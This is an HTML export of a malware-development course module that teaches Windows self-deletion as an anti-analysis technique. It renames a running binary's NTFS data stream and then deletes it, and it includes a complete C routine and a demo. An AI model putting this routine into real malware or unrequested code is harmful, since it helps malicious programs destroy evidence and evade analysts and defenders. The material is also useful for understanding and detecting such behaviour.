<html><head><meta http-equiv="Content-Type" content="text/html; charset=utf-8"/><title>72. Anti-Debugging - Self-Deletion</title><style>
/* cspell:disable-file */
/* webkit printing magic: print all background colors */
html {
	-webkit-print-color-adjust: exact;
}
* {
	box-sizing: border-box;
	-webkit-print-color-adjust: exact;
}

html,
body {
	margin: 0;
	padding: 0;
}
@media only screen {
	body {
		margin: 2em auto;
		max-width: 900px;
		color: rgb(55, 53, 47);
	}
}

body {
	line-height: 1.5;
	white-space: pre-wrap;
}

a,
a.visited {
	color: inherit;
	text-decoration: underline;
}

.pdf-relative-link-path {
	font-size: 80%;
	color: #444;
}

h1,
h2,
h3 {
	letter-spacing: -0.01em;
	line-height: 1.2;
	font-weight: 600;
	margin-bottom: 0;
}

.page-title {
	font-size: 2.5rem;
	font-weight: 700;
	margin-top: 0;
	margin-bottom: 0.75em;
}

h1 {
	font-size: 1.875rem;
	margin-top: 1.875rem;
}

h2 {
	font-size: 1.5rem;
	margin-top: 1.5rem;
}

h3 {
	font-size: 1.25rem;
	margin-top: 1.25rem;
}

.source {
	border: 1px solid #ddd;
	border-radius: 3px;
	padding: 1.5em;
	word-break: break-all;
}

.callout {
	border-radius: 3px;
	padding: 1rem;
}

figure {
	margin: 1.25em 0;
	page-break-inside: avoid;
}

figcaption {
	opacity: 0.5;
	font-size: 85%;
	margin-top: 0.5em;
}

mark {
	background-color: transparent;
}

.indented {
	padding-left: 1.5em;
}

hr {
	background: transparent;
	display: block;
	width: 100%;
	height: 1px;
	visibility: visible;
	border: none;
	border-bottom: 1px solid rgba(55, 53, 47, 0.09);
}

img {
	max-width: 100%;
}

@media only print {
	img {
		max-height: 100vh;
		object-fit: contain;
	}
}

@page {
	margin: 1in;
}

.collection-content {
	font-size: 0.875rem;
}

.column-list {
	display: flex;
	justify-content: space-between;
}

.column {
	padding: 0 1em;
}

.column:first-child {
	padding-left: 0;
}

.column:last-child {
	padding-right: 0;
}

.table_of_contents-item {
	display: block;
	font-size: 0.875rem;
	line-height: 1.3;
	padding: 0.125rem;
}

.table_of_contents-indent-1 {
	margin-left: 1.5rem;
}

.table_of_contents-indent-2 {
	margin-left: 3rem;
}

.table_of_contents-indent-3 {
	margin-left: 4.5rem;
}

.table_of_contents-link {
	text-decoration: none;
	opacity: 0.7;
	border-bottom: 1px solid rgba(55, 53, 47, 0.18);
}

table,
th,
td {
	border: 1px solid rgba(55, 53, 47, 0.09);
	border-collapse: collapse;
}

table {
	border-left: none;
	border-right: none;
}

th,
td {
	font-weight: normal;
	padding: 0.25em 0.5em;
	line-height: 1.5;
	min-height: 1.5em;
	text-align: left;
}

th {
	color: rgba(55, 53, 47, 0.6);
}

ol,
ul {
	margin: 0;
	margin-block-start: 0.6em;
	margin-block-end: 0.6em;
}

li > ol:first-child,
li > ul:first-child {
	margin-block-start: 0.6em;
}

ul > li {
	list-style: disc;
}

ul.to-do-list {
	padding-inline-start: 0;
}

ul.to-do-list > li {
	list-style: none;
}

.to-do-children-checked {
	text-decoration: line-through;
	opacity: 0.375;
}

ul.toggle > li {
	list-style: none;
}

ul {
	padding-inline-start: 1.7em;
}

ul > li {
	padding-left: 0.1em;
}

ol {
	padding-inline-start: 1.6em;
}

ol > li {
	padding-left: 0.2em;
}

.mono ol {
	padding-inline-start: 2em;
}

.mono ol > li {
	text-indent: -0.4em;
}

.toggle {
	padding-inline-start: 0em;
	list-style-type: none;
}

/* Indent toggle children */
.toggle > li > details {
	padding-left: 1.7em;
}

.toggle > li > details > summary {
	margin-left: -1.1em;
}

.selected-value {
	display: inline-block;
	padding: 0 0.5em;
	background: rgba(206, 205, 202, 0.5);
	border-radius: 3px;
	margin-right: 0.5em;
	margin-top: 0.3em;
	margin-bottom: 0.3em;
	white-space: nowrap;
}

.collection-title {
	display: inline-block;
	margin-right: 1em;
}

.simple-table {
	margin-top: 1em;
	font-size: 0.875rem;
	empty-cells: show;
}
.simple-table td {
	height: 29px;
	min-width: 120px;
}

.simple-table th {
	height: 29px;
	min-width: 120px;
}

.simple-table-header-color {
	background: rgb(247, 246, 243);
	color: black;
}
.simple-table-header {
	font-weight: 500;
}

time {
	opacity: 0.5;
}

.icon {
	display: inline-block;
	max-width: 1.2em;
	max-height: 1.2em;
	text-decoration: none;
	vertical-align: text-bottom;
	margin-right: 0.5em;
}

img.icon {
	border-radius: 3px;
}

.user-icon {
	width: 1.5em;
	height: 1.5em;
	border-radius: 100%;
	margin-right: 0.5rem;
}

.user-icon-inner {
	font-size: 0.8em;
}

.text-icon {
	border: 1px solid #000;
	text-align: center;
}

.page-cover-image {
	display: block;
	object-fit: cover;
	width: 100%;
	max-height: 30vh;
}

.page-header-icon {
	font-size: 3rem;
	margin-bottom: 1rem;
}

.page-header-icon-with-cover {
	margin-top: -0.72em;
	margin-left: 0.07em;
}

.page-header-icon img {
	border-radius: 3px;
}

.link-to-page {
	margin: 1em 0;
	padding: 0;
	border: none;
	font-weight: 500;
}

p > .user {
	opacity: 0.5;
}

td > .user,
td > time {
	white-space: nowrap;
}

input[type="checkbox"] {
	transform: scale(1.5);
	margin-right: 0.6em;
	vertical-align: middle;
}

p {
	margin-top: 0.5em;
	margin-bottom: 0.5em;
}

.image {
	border: none;
	margin: 1.5em 0;
	padding: 0;
	border-radius: 0;
	text-align: center;
}

.code,
code {
	background: rgba(135, 131, 120, 0.15);
	border-radius: 3px;
	padding: 0.2em 0.4em;
	border-radius: 3px;
	font-size: 85%;
	tab-size: 2;
}

code {
	color: #eb5757;
}

.code {
	padding: 1.5em 1em;
}

.code-wrap {
	white-space: pre-wrap;
	word-break: break-all;
}

.code > code {
	background: none;
	padding: 0;
	font-size: 100%;
	color: inherit;
}

blockquote {
	font-size: 1.25em;
	margin: 1em 0;
	padding-left: 1em;
	border-left: 3px solid rgb(55, 53, 47);
}

.bookmark {
	text-decoration: none;
	max-height: 8em;
	padding: 0;
	display: flex;
	width: 100%;
	align-items: stretch;
}

.bookmark-title {
	font-size: 0.85em;
	overflow: hidden;
	text-overflow: ellipsis;
	height: 1.75em;
	white-space: nowrap;
}

.bookmark-text {
	display: flex;
	flex-direction: column;
}

.bookmark-info {
	flex: 4 1 180px;
	padding: 12px 14px 14px;
	display: flex;
	flex-direction: column;
	justify-content: space-between;
}

.bookmark-image {
	width: 33%;
	flex: 1 1 180px;
	display: block;
	position: relative;
	object-fit: cover;
	border-radius: 1px;
}

.bookmark-description {
	color: rgba(55, 53, 47, 0.6);
	font-size: 0.75em;
	overflow: hidden;
	max-height: 4.5em;
	word-break: break-word;
}

.bookmark-href {
	font-size: 0.75em;
	margin-top: 0.25em;
}

.sans { font-family: ui-sans-serif, -apple-system, BlinkMacSystemFont, "Segoe UI", Helvetica, "Apple Color Emoji", Arial, sans-serif, "Segoe UI Emoji", "Segoe UI Symbol"; }
.code { font-family: "SFMono-Regular", Menlo, Consolas, "PT Mono", "Liberation Mono", Courier, monospace; }
.serif { font-family: Lyon-Text, Georgia, ui-serif, serif; }
.mono { font-family: iawriter-mono, Nitti, Menlo, Courier, monospace; }
.pdf .sans { font-family: Inter, ui-sans-serif, -apple-system, BlinkMacSystemFont, "Segoe UI", Helvetica, "Apple Color Emoji", Arial, sans-serif, "Segoe UI Emoji", "Segoe UI Symbol", 'Twemoji', 'Noto Color Emoji', 'Noto Sans CJK JP'; }
.pdf:lang(zh-CN) .sans { font-family: Inter, ui-sans-serif, -apple-system, BlinkMacSystemFont, "Segoe UI", Helvetica, "Apple Color Emoji", Arial, sans-serif, "Segoe UI Emoji", "Segoe UI Symbol", 'Twemoji', 'Noto Color Emoji', 'Noto Sans CJK SC'; }
.pdf:lang(zh-TW) .sans { font-family: Inter, ui-sans-serif, -apple-system, BlinkMacSystemFont, "Segoe UI", Helvetica, "Apple Color Emoji", Arial, sans-serif, "Segoe UI Emoji", "Segoe UI Symbol", 'Twemoji', 'Noto Color Emoji', 'Noto Sans CJK TC'; }
.pdf:lang(ko-KR) .sans { font-family: Inter, ui-sans-serif, -apple-system, BlinkMacSystemFont, "Segoe UI", Helvetica, "Apple Color Emoji", Arial, sans-serif, "Segoe UI Emoji", "Segoe UI Symbol", 'Twemoji', 'Noto Color Emoji', 'Noto Sans CJK KR'; }
.pdf .code { font-family: Source Code Pro, "SFMono-Regular", Menlo, Consolas, "PT Mono", "Liberation Mono", Courier, monospace, 'Twemoji', 'Noto Color Emoji', 'Noto Sans Mono CJK JP'; }
.pdf:lang(zh-CN) .code { font-family: Source Code Pro, "SFMono-Regular", Menlo, Consolas, "PT Mono", "Liberation Mono", Courier, monospace, 'Twemoji', 'Noto Color Emoji', 'Noto Sans Mono CJK SC'; }
.pdf:lang(zh-TW) .code { font-family: Source Code Pro, "SFMono-Regular", Menlo, Consolas, "PT Mono", "Liberation Mono", Courier, monospace, 'Twemoji', 'Noto Color Emoji', 'Noto Sans Mono CJK TC'; }
.pdf:lang(ko-KR) .code { font-family: Source Code Pro, "SFMono-Regular", Menlo, Consolas, "PT Mono", "Liberation Mono", Courier, monospace, 'Twemoji', 'Noto Color Emoji', 'Noto Sans Mono CJK KR'; }
.pdf .serif { font-family: PT Serif, Lyon-Text, Georgia, ui-serif, serif, 'Twemoji', 'Noto Color Emoji', 'Noto Serif CJK JP'; }
.pdf:lang(zh-CN) .serif { font-family: PT Serif, Lyon-Text, Georgia, ui-serif, serif, 'Twemoji', 'Noto Color Emoji', 'Noto Serif CJK SC'; }
.pdf:lang(zh-TW) .serif { font-family: PT Serif, Lyon-Text, Georgia, ui-serif, serif, 'Twemoji', 'Noto Color Emoji', 'Noto Serif CJK TC'; }
.pdf:lang(ko-KR) .serif { font-family: PT Serif, Lyon-Text, Georgia, ui-serif, serif, 'Twemoji', 'Noto Color Emoji', 'Noto Serif CJK KR'; }
.pdf .mono { font-family: PT Mono, iawriter-mono, Nitti, Menlo, Courier, monospace, 'Twemoji', 'Noto Color Emoji', 'Noto Sans Mono CJK JP'; }
.pdf:lang(zh-CN) .mono { font-family: PT Mono, iawriter-mono, Nitti, Menlo, Courier, monospace, 'Twemoji', 'Noto Color Emoji', 'Noto Sans Mono CJK SC'; }
.pdf:lang(zh-TW) .mono { font-family: PT Mono, iawriter-mono, Nitti, Menlo, Courier, monospace, 'Twemoji', 'Noto Color Emoji', 'Noto Sans Mono CJK TC'; }
.pdf:lang(ko-KR) .mono { font-family: PT Mono, iawriter-mono, Nitti, Menlo, Courier, monospace, 'Twemoji', 'Noto Color Emoji', 'Noto Sans Mono CJK KR'; }
.highlight-default {
	color: rgba(55, 53, 47, 1);
}
.highlight-gray {
	color: rgba(120, 119, 116, 1);
	fill: rgba(120, 119, 116, 1);
}
.highlight-brown {
	color: rgba(159, 107, 83, 1);
	fill: rgba(159, 107, 83, 1);
}
.highlight-orange {
	color: rgba(217, 115, 13, 1);
	fill: rgba(217, 115, 13, 1);
}
.highlight-yellow {
	color: rgba(203, 145, 47, 1);
	fill: rgba(203, 145, 47, 1);
}
.highlight-teal {
	color: rgba(68, 131, 97, 1);
	fill: rgba(68, 131, 97, 1);
}
.highlight-blue {
	color: rgba(51, 126, 169, 1);
	fill: rgba(51, 126, 169, 1);
}
.highlight-purple {
	color: rgba(144, 101, 176, 1);
	fill: rgba(144, 101, 176, 1);
}
.highlight-pink {
	color: rgba(193, 76, 138, 1);
	fill: rgba(193, 76, 138, 1);
}
.highlight-red {
	color: rgba(212, 76, 71, 1);
	fill: rgba(212, 76, 71, 1);
}
.highlight-gray_background {
	background: rgba(241, 241, 239, 1);
}
.highlight-brown_background {
	background: rgba(244, 238, 238, 1);
}
.highlight-orange_background {
	background: rgba(251, 236, 221, 1);
}
.highlight-yellow_background {
	background: rgba(251, 243, 219, 1);
}
.highlight-teal_background {
	background: rgba(237, 243, 236, 1);
}
.highlight-blue_background {
	background: rgba(231, 243, 248, 1);
}
.highlight-purple_background {
	background: rgba(244, 240, 247, 0.8);
}
.highlight-pink_background {
	background: rgba(249, 238, 243, 0.8);
}
.highlight-red_background {
	background: rgba(253, 235, 236, 1);
}
.block-color-default {
	color: inherit;
	fill: inherit;
}
.block-color-gray {
	color: rgba(120, 119, 116, 1);
	fill: rgba(120, 119, 116, 1);
}
.block-color-brown {
	color: rgba(159, 107, 83, 1);
	fill: rgba(159, 107, 83, 1);
}
.block-color-orange {
	color: rgba(217, 115, 13, 1);
	fill: rgba(217, 115, 13, 1);
}
.block-color-yellow {
	color: rgba(203, 145, 47, 1);
	fill: rgba(203, 145, 47, 1);
}
.block-color-teal {
	color: rgba(68, 131, 97, 1);
	fill: rgba(68, 131, 97, 1);
}
.block-color-blue {
	color: rgba(51, 126, 169, 1);
	fill: rgba(51, 126, 169, 1);
}
.block-color-purple {
	color: rgba(144, 101, 176, 1);
	fill: rgba(144, 101, 176, 1);
}
.block-color-pink {
	color: rgba(193, 76, 138, 1);
	fill: rgba(193, 76, 138, 1);
}
.block-color-red {
	color: rgba(212, 76, 71, 1);
	fill: rgba(212, 76, 71, 1);
}
.block-color-gray_background {
	background: rgba(241, 241, 239, 1);
}
.block-color-brown_background {
	background: rgba(244, 238, 238, 1);
}
.block-color-orange_background {
	background: rgba(251, 236, 221, 1);
}
.block-color-yellow_background {
	background: rgba(251, 243, 219, 1);
}
.block-color-teal_background {
	background: rgba(237, 243, 236, 1);
}
.block-color-blue_background {
	background: rgba(231, 243, 248, 1);
}
.block-color-purple_background {
	background: rgba(244, 240, 247, 0.8);
}
.block-color-pink_background {
	background: rgba(249, 238, 243, 0.8);
}
.block-color-red_background {
	background: rgba(253, 235, 236, 1);
}
.select-value-color-pink { background-color: rgba(245, 224, 233, 1); }
.select-value-color-purple { background-color: rgba(232, 222, 238, 1); }
.select-value-color-green { background-color: rgba(219, 237, 219, 1); }
.select-value-color-gray { background-color: rgba(227, 226, 224, 1); }
.select-value-color-translucentGray { background-color: rgba(255, 255, 255, 0.0375); }
.select-value-color-orange { background-color: rgba(250, 222, 201, 1); }
.select-value-color-brown { background-color: rgba(238, 224, 218, 1); }
.select-value-color-red { background-color: rgba(255, 226, 221, 1); }
.select-value-color-yellow { background-color: rgba(253, 236, 200, 1); }
.select-value-color-blue { background-color: rgba(211, 229, 239, 1); }

.checkbox {
	display: inline-flex;
	vertical-align: text-bottom;
	width: 16;
	height: 16;
	background-size: 16px;
	margin-left: 2px;
	margin-right: 5px;
}

.checkbox-on {
	background-image: url("data:image/svg+xml;charset=UTF-8,%3Csvg%20width%3D%2216%22%20height%3D%2216%22%20viewBox%3D%220%200%2016%2016%22%20fill%3D%22none%22%20xmlns%3D%22http%3A%2F%2Fwww.w3.org%2F2000%2Fsvg%22%3E%0A%3Crect%20width%3D%2216%22%20height%3D%2216%22%20fill%3D%22%2358A9D7%22%2F%3E%0A%3Cpath%20d%3D%22M6.71429%2012.2852L14%204.9995L12.7143%203.71436L6.71429%209.71378L3.28571%206.2831L2%207.57092L6.71429%2012.2852Z%22%20fill%3D%22white%22%2F%3E%0A%3C%2Fsvg%3E");
}

.checkbox-off {
	background-image: url("data:image/svg+xml;charset=UTF-8,%3Csvg%20width%3D%2216%22%20height%3D%2216%22%20viewBox%3D%220%200%2016%2016%22%20fill%3D%22none%22%20xmlns%3D%22http%3A%2F%2Fwww.w3.org%2F2000%2Fsvg%22%3E%0A%3Crect%20x%3D%220.75%22%20y%3D%220.75%22%20width%3D%2214.5%22%20height%3D%2214.5%22%20fill%3D%22white%22%20stroke%3D%22%2336352F%22%20stroke-width%3D%221.5%22%2F%3E%0A%3C%2Fsvg%3E");
}
	
</style></head><body><article id="97e7cad5-6b8d-474b-9798-8fb7c91703d5" class="page sans"><header><h1 class="page-title"><a href="https://maldevacademy.com/modules/72"><strong>72. Anti-Debugging - Self-Deletion</strong></a></h1></header><div class="page-body"><h2 id="844deaf7-8e5d-4249-8fe6-89f423124c7e" class=""><strong>Anti-Debugging - Self-Deletion</strong></h2><h3 id="1748da1f-7615-4882-b62b-205ece44abfe" class=""><strong>Introduction</strong></h3><p id="cab1c8dd-8936-4214-9ecd-2c04f4120cd2" class="">During the previous module, multiple techniques were discussed to obstruct researchers and malware analysts from inspecting the malware and prevent them from understanding the functionality or creating signatures. This module will cover an advanced anti-debugging technique that works by making the malware to self-delete.</p><h3 id="e54b508e-0197-4a91-b37f-b33554277877" class=""><strong>The NTFS file system</strong></h3><p id="f4ef472f-95a2-4783-b6a8-ef90f66ff7b7" class="">Before diving into self-deletion, it&#x27;s important to understand how New Technology File System (NTFS) works. NTFS is a proprietary file system implemented as the primary file system for the Windows operating system. It surpasses its predecessors, FAT and exFAT, by offering features such as file and folder permissions, compression, encryption, hard links, symbolic links, and transactional operations. NTFS also offers enhanced reliability, performance, and scalability.</p><p id="9c4216c0-0e01-4612-97d4-47950589e742" class="">NTFS file system also supports <a href="https://owasp.org/www-community/attacks/Windows_alternate_data_stream">alternate data streams</a>. Files in NTFS file systems can have multiple streams of data in addition to the default stream, <code>:$DATA</code>. <code>:$DATA</code> exists for every file, providing an alternative means of accessing them.</p><h3 id="8d225229-135c-4037-8a33-3229de4a7c05" class=""><strong>Deleting A Running Binary</strong></h3><p id="4aed4513-e536-49af-8fd2-15715b94af1c" class="">It is not possible to delete the current running process&#x27;s binary on Windows since deleting a file normally requires that no other process is using it. The image below shows an unsuccessful attempt to delete the &quot;Release&quot; folder while having a file opened within that folder open.</p><figure id="1f59aed8-8599-4afc-a0d7-84eefa6092a0" class="image"><a href="72%20Anti-Debugging%20-%20Self-Deletion%2097e7cad56b8d474b97988fb7c91703d5/self-deletion-115320077-5c34dcbb-2e0e-461d-b8e5-a1b34d72b139.png"><img style="width:1843px" src="72%20Anti-Debugging%20-%20Self-Deletion%2097e7cad56b8d474b97988fb7c91703d5/self-deletion-115320077-5c34dcbb-2e0e-461d-b8e5-a1b34d72b139.png"/></a></figure><p id="312d36c6-ac63-43d8-9c05-c3b7d6f4deee" class="">Another example is shown using the <a href="https://learn.microsoft.com/en-us/windows/win32/api/fileapi/nf-fileapi-deletefilea">DeleteFile</a> WinAPI which deletes an existing file. The <code>DeleteFile</code> WinAPI fails with an <code>ERROR_ACCESS_DENIED</code> error.</p><figure id="9c39b3b7-d73c-4225-940b-696d00859d25" class="image"><a href="72%20Anti-Debugging%20-%20Self-Deletion%2097e7cad56b8d474b97988fb7c91703d5/self-deletion-215320748-1964cf44-c332-443a-9f52-465aa7ffe9be.png"><img style="width:1674px" src="72%20Anti-Debugging%20-%20Self-Deletion%2097e7cad56b8d474b97988fb7c91703d5/self-deletion-215320748-1964cf44-c332-443a-9f52-465aa7ffe9be.png"/></a></figure><p id="53f23fcb-f936-4d98-b3db-ec832291434a" class="">One way to get around this is by renaming the default data stream <code>:$DATA</code> to another random name that represents a new data stream. After that, deleting the newly renamed data stream will result in the binary being erased from the disk, even while it&#x27;s still running.</p><h3 id="d41b55e0-f615-4745-8c50-f170be7719a5" class=""><strong>Retrieve File Handle</strong></h3><p id="ebba65ac-26f8-4fcb-9eff-e1f545e9b7d6" class="">The first step of the process is to retrieve a handle of the target file, which is the local implementation&#x27;s file. The file handle can be retrieved using the <code>CreateFile</code> WinAPI. The <a href="https://learn.microsoft.com/en-us/windows/win32/secauthz/access-mask">access flag</a> must be set to <code>DELETE</code> to provide file deletion permissions.</p><h3 id="269c3f82-ae21-4908-a46e-4c9b71cfb445" class=""><strong>Renaming The Data Stream</strong></h3><p id="4dde0742-ac72-4b0c-8051-6dc5318d4c04" class="">The next step to delete a running binary file is to rename the <code>:$DATA</code> data stream. This can be achieved by using the <a href="https://learn.microsoft.com/en-us/windows/win32/api/fileapi/nf-fileapi-setfileinformationbyhandle">SetFileInformationByHandle</a> WinAPI with the <code>FileRenameInfo</code> flag.</p><p id="5fe40892-986a-40ca-91f2-f5af0d6035cb" class="">The <code>SetFileInformationByHandle</code> WinAPI function is shown below.</p><pre id="f7d48c2c-e83b-4730-93d2-322dc987e1d1" class="code code-wrap"><code>BOOL SetFileInformationByHandle(
  [in] HANDLE                    hFile,                       // Handle to the file for which to change information.
  [in] FILE_INFO_BY_HANDLE_CLASS FileInformationClass,        // Flag value that specifies the type of information to be changed
  [in] LPVOID                    lpFileInformation,           // Pointer to the buffer that contains the information to change for
  [in] DWORD                     dwBufferSize                 // The size of &#x27;lpFileInformation&#x27; buffer in bytes
);
</code></pre><p id="5c6c1055-4de8-4214-b603-e8bcb73a0625" class="">The <code>FileInformationClass</code> parameter should be a <a href="https://learn.microsoft.com/en-us/windows/win32/api/minwinbase/ne-minwinbase-file_info_by_handle_class">FILE_INFO_BY_HANDLE_CLASS</a> enumeration value.</p><p id="e8a2a9a0-3c5d-464d-ae57-8a55fe75c8f7" class="">When the <code>FileInformationClass</code> parameter is set to <code>FileRenameInfo</code>, then <code>lpFileInformation</code> must be a pointer to the <a href="https://learn.microsoft.com/en-us/windows/win32/api/winbase/ns-winbase-file_rename_info">FILE_RENAME_INFO</a> structure, this is mentioned by Microsoft as shown in the following image</p><figure id="7de4871f-a6b0-4717-8ff6-39461bb45c8e" class="image"><a href="https://maldevacademy.s3.amazonaws.com/images/Intermediate/self-deletion-522060452-81349155-d24a-4b8a-b84c-fa231dfcbf3b.png"><img src="https://maldevacademy.s3.amazonaws.com/images/Intermediate/self-deletion-522060452-81349155-d24a-4b8a-b84c-fa231dfcbf3b.png"/></a></figure><h3 id="c750b6c1-eed8-470d-8476-9275c21ef414" class=""><strong>FILE_RENAME_INFO Structure</strong></h3><p id="9e0e963b-e7d3-4505-84e5-87d1133d5980" class="">The <code>FILE_RENAME_INFO</code> structure is shown below.</p><pre id="b5f4dc17-4691-454f-9775-008432c520be" class="code code-wrap"><code>typedef struct _FILE_RENAME_INFO {
  union {
    BOOLEAN ReplaceIfExists;
    DWORD   Flags;
  } DUMMYUNIONNAME;
  BOOLEAN ReplaceIfExists;
  HANDLE  RootDirectory;
  DWORD   FileNameLength;   // The size of &#x27;FileName&#x27; in bytes
  WCHAR   FileName[1];      // The new name
} FILE_RENAME_INFO, *PFILE_RENAME_INFO;
</code></pre><p id="5ff1803d-eea4-40c2-94da-1513b9ced9e8" class="">The two members that need to be set are <code>FileNameLength</code> and <code>FileName</code>. Microsoft&#x27;s documentation explains how to define a new NTFS file stream name.</p><figure id="c5d85a11-d216-4ced-bd61-ecc031cdeebf" class="image"><a href="72%20Anti-Debugging%20-%20Self-Deletion%2097e7cad56b8d474b97988fb7c91703d5/self-deletion-315324185-4157dabc-fe41-4a40-b1ce-caf4c3a19c1f.png"><img style="width:1214px" src="72%20Anti-Debugging%20-%20Self-Deletion%2097e7cad56b8d474b97988fb7c91703d5/self-deletion-315324185-4157dabc-fe41-4a40-b1ce-caf4c3a19c1f.png"/></a></figure><p id="e18d7b55-a672-4cad-9c8e-26559a3bb37e" class="">Therefore, <code>FileName</code> should be a wide-character string that starts with a colon (<code>:</code>).</p><h3 id="f2174d6e-134c-4119-a2a7-39267d04ce06" class=""><strong>Deleting The Data Stream</strong></h3><p id="a5c81d18-0905-48e6-b58f-4152208b7fff" class="">The last step is to delete the <code>:$DATA</code> stream to erase the file from the disk. To do so, the same <code>SetFileInformationByHandle</code> WinAPI will be used, with a different flag, <code>FileDispositionInfo</code>. This flag marks the file for deletion when its handle is closed. This is the flag Microsoft uses in the <a href="https://learn.microsoft.com/en-us/windows/win32/api/fileapi/nf-fileapi-setfileinformationbyhandle#examples">example section</a>.</p><p id="0e261526-d656-4512-a94d-d2dad505681c" class="">When the <code>FileDispositionInfo</code> flag is used, <code>lpFileInformation</code> must be a pointer to the <a href="https://learn.microsoft.com/en-us/windows/win32/api/winbase/ns-winbase-file_disposition_info">FILE_DISPOSITION_INFO</a> structure, this is mentioned by Microsoft as shown in the following image</p><figure id="4d4a008d-e05a-4035-a7b9-3da9ef861816" class="image"><a href="72%20Anti-Debugging%20-%20Self-Deletion%2097e7cad56b8d474b97988fb7c91703d5/self-deletion-6222060992-0b642d05-e871-4ed1-b2f0-a634796ea284.png"><img style="width:799px" src="72%20Anti-Debugging%20-%20Self-Deletion%2097e7cad56b8d474b97988fb7c91703d5/self-deletion-6222060992-0b642d05-e871-4ed1-b2f0-a634796ea284.png"/></a></figure><p id="ea42a297-3404-4ffb-bf6c-a6e39acd6cab" class="">The <code>FILE_DISPOSITION_INFO</code> structure is shown below.</p><pre id="0965684d-d5c5-4333-a8d6-9ed3518f2b03" class="code code-wrap"><code>typedef struct _FILE_DISPOSITION_INFO {
  BOOLEAN DeleteFile;       // Set to &#x27;TRUE&#x27; to mark the file for deletion
} FILE_DISPOSITION_INFO, *PFILE_DISPOSITION_INFO;
</code></pre><p id="0597fd6f-29e7-4dc6-a369-2b35cf73744b" class="">The <code>DeleteFile</code> member must simply be set to <code>TRUE</code> to delete the file.</p><h3 id="0a409e9b-2384-4381-835b-729921e74b66" class=""><strong>Refreshing File Data Stream</strong></h3><p id="e3015ba2-dc11-49d4-829a-9b32c2cf8e81" class="">After calling <code>SetFileInformationByHandle</code> for the first time to rename the file&#x27;s NTFS file stream, the file handle should be closed and re-opened with another <code>CreateFile</code> call. This is done to refresh the file data stream so that the new handle contains the new data stream.</p><h3 id="320a3aa2-b43b-47d2-bd22-8b3369405aae" class=""><strong>Self-Deletion Final Code</strong></h3><p id="77006ff9-1103-4c3b-9901-ee4f08551f28" class="">The <code>DeleteSelf</code> function shown below uses the described process to delete a file from the disk while it&#x27;s running.</p><p id="7804d3c2-2719-46be-9808-49154615c5b4" class="">Everything in the code snippet below has been previously explained except for the <a href="https://learn.microsoft.com/en-us/windows/win32/api/libloaderapi/nf-libloaderapi-getmodulefilenamew">GetModuleFileNameW</a> WinAPI. This function is used to retrieve the path for the file that contains the specified module. If the first parameter is set to <code>NULL</code> (as in the code snippet below), then it retrieves the path of the executable file for the <em>current process</em>.</p><pre id="f0a4e54b-d2fa-4ea9-bf5a-7cce38cef2d4" class="code code-wrap"><code>// The new data stream name
#define NEW_STREAM L&quot;:Maldev&quot;


BOOL DeleteSelf() {


	WCHAR                       szPath [MAX_PATH * 2] = { 0 };
	FILE_DISPOSITION_INFO       Delete                = { 0 };
	HANDLE                      hFile                 = INVALID_HANDLE_VALUE;
	PFILE_RENAME_INFO           pRename               = NULL;
	const wchar_t*              NewStream             = (const wchar_t*)NEW_STREAM;
	SIZE_T                      sRename               = sizeof(FILE_RENAME_INFO) + sizeof(NewStream);


    // Allocating enough buffer for the &#x27;FILE_RENAME_INFO&#x27; structure
	pRename = HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, sRename);
	if (!pRename) {
		printf(&quot;[!] HeapAlloc Failed With Error : %d \n&quot;, GetLastError());
		return FALSE;
	}

    // Cleaning up some structures
	ZeroMemory(szPath, sizeof(szPath));
	ZeroMemory(&amp;Delete, sizeof(FILE_DISPOSITION_INFO));

	//----------------------------------------------------------------------------------------
    // Marking the file for deletion (used in the 2nd SetFileInformationByHandle call)
	Delete.DeleteFile = TRUE;

    // Setting the new data stream name buffer and size in the &#x27;FILE_RENAME_INFO&#x27; structure
	pRename-&gt;FileNameLength = sizeof(NewStream);
	RtlCopyMemory(pRename-&gt;FileName, NewStream, sizeof(NewStream));

	//----------------------------------------------------------------------------------------

    // Used to get the current file name
	if (GetModuleFileNameW(NULL, szPath, MAX_PATH * 2) == 0) {
		printf(&quot;[!] GetModuleFileNameW Failed With Error : %d \n&quot;, GetLastError());
		return FALSE;
	}

	//----------------------------------------------------------------------------------------
    // RENAMING

    // Opening a handle to the current file
	hFile = CreateFileW(szPath, DELETE | SYNCHRONIZE, FILE_SHARE_READ, NULL, OPEN_EXISTING, NULL, NULL);
	if (hFile == INVALID_HANDLE_VALUE) {
		printf(&quot;[!] CreateFileW [R] Failed With Error : %d \n&quot;, GetLastError());
		return FALSE;
	}

	wprintf(L&quot;[i] Renaming :$DATA to %s  ...&quot;, NEW_STREAM);

    // Renaming the data stream
	if (!SetFileInformationByHandle(hFile, FileRenameInfo, pRename, sRename)) {
		printf(&quot;[!] SetFileInformationByHandle [R] Failed With Error : %d \n&quot;, GetLastError());
		return FALSE;
	}
	wprintf(L&quot;[+] DONE \n&quot;);

	CloseHandle(hFile);

	//----------------------------------------------------------------------------------------
    // DELEING

    // Opening a new handle to the current file
	hFile = CreateFileW(szPath, DELETE | SYNCHRONIZE, FILE_SHARE_READ, NULL, OPEN_EXISTING, NULL, NULL);
	if (hFile == INVALID_HANDLE_VALUE) {
		printf(&quot;[!] CreateFileW [D] Failed With Error : %d \n&quot;, GetLastError());
		return FALSE;
	}

	wprintf(L&quot;[i] DELETING ...&quot;);

    // Marking for deletion after the file&#x27;s handle is closed
	if (!SetFileInformationByHandle(hFile, FileDispositionInfo, &amp;Delete, sizeof(Delete))) {
		printf(&quot;[!] SetFileInformationByHandle [D] Failed With Error : %d \n&quot;, GetLastError());
		return FALSE;
	}
	wprintf(L&quot;[+] DONE \n&quot;);

	CloseHandle(hFile);

	//----------------------------------------------------------------------------------------

    // Freeing the allocated buffer
	HeapFree(GetProcessHeap(), 0, pRename);

	return TRUE;
}

</code></pre><h3 id="84c816b2-c783-4724-8733-2ff4cfd66b42" class=""><strong>Demo</strong></h3><p id="86e20ff5-b389-4dfd-8132-b56e81015c7f" class="">The image below shows the <code>SelfDeletion.exe</code> process running although the binary file was erased from disk.</p><figure id="e01c882d-8aa6-4dde-8c3a-e71b6f70cb97" class="image"><a href="72%20Anti-Debugging%20-%20Self-Deletion%2097e7cad56b8d474b97988fb7c91703d5/self-deletion-415326977-a40ef9d4-4c54-4c0b-b02c-c3396e24a221.png"><img style="width:1749px" src="72%20Anti-Debugging%20-%20Self-Deletion%2097e7cad56b8d474b97988fb7c91703d5/self-deletion-415326977-a40ef9d4-4c54-4c0b-b02c-c3396e24a221.png"/></a></figure></div></article></body></html>